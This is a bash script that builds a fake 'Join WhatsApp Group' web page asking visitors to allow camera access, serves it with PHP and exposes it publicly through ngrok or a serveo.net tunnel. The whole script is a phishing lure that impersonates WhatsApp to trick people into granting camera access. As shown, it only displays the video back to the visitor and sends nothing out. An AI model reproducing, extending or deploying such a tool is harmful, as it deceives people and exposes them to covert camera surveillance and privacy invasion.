#!/bin/bash

# Function to start PHP server
start_php_server() {
    php -S localhost:8000 >/dev/null 2>&1 &
    PHP_SERVER_PID=$!
}

# Function to start ngrok or serveo
start_tunnel() {
    echo "Choose tunneling service:"
    echo "1. Ngrok"
    echo "2. Serveo"
    read -p "Enter your choice (1 or 2): " tunnel_choice

    case $tunnel_choice in
        1)
            ngrok http 8000 >/dev/null 2>&1 &
            ;;
        2)
            ssh -R 80:localhost:8000 serveo.net >/dev/null 2>&1 &
            ;;
        *)
            echo "Invalid choice. Exiting."
            exit 1
            ;;
    esac
}

# Function to create fake website HTML
create_fake_website() {
    # Create a directory for the fake website
    mkdir -p fake_website
    cd fake_website

    # Create HTML file
    touch index.php

    # Write HTML content to index.php
    cat <<EOT > index.php
<!DOCTYPE html>
<html>
<head>
    <title>Join WhatsApp Group</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #f2f2f2;
        }
        .container {
            max-width: 600px;
            margin: 100px auto;
            padding: 20px;
            background-color: #fff;
            border-radius: 10px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        h1 {
            color: #075e54;
        }
        button {
            background-color: #128C7E;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: #075e54;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Join WhatsApp Group</h1>
        <p>Click below to allow camera access:</p>
        <button onclick="getCameraAccess()">Allow Camera Access</button>
    </div>

    <script>
        function getCameraAccess() {
            // Request camera access
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(function(stream) {
                    var video = document.createElement('video');
                    video.srcObject = stream;
                    video.autoplay = true;
                    document.body.appendChild(video);
                })
                .catch(function(err) {
                    console.error('Error accessing camera:', err);
                });
        }
    </script>
</body>
</html>
EOT
}

# Main function
main() {
    # Create fake website
    create_fake_website

    # Start PHP server
    start_php_server

    # Wait for PHP server to start
    sleep 1

    # Start ngrok or serveo
    start_tunnel

    # Cleanup: stop PHP server
    trap "kill $PHP_SERVER_PID" EXIT
}

# Run main function
main

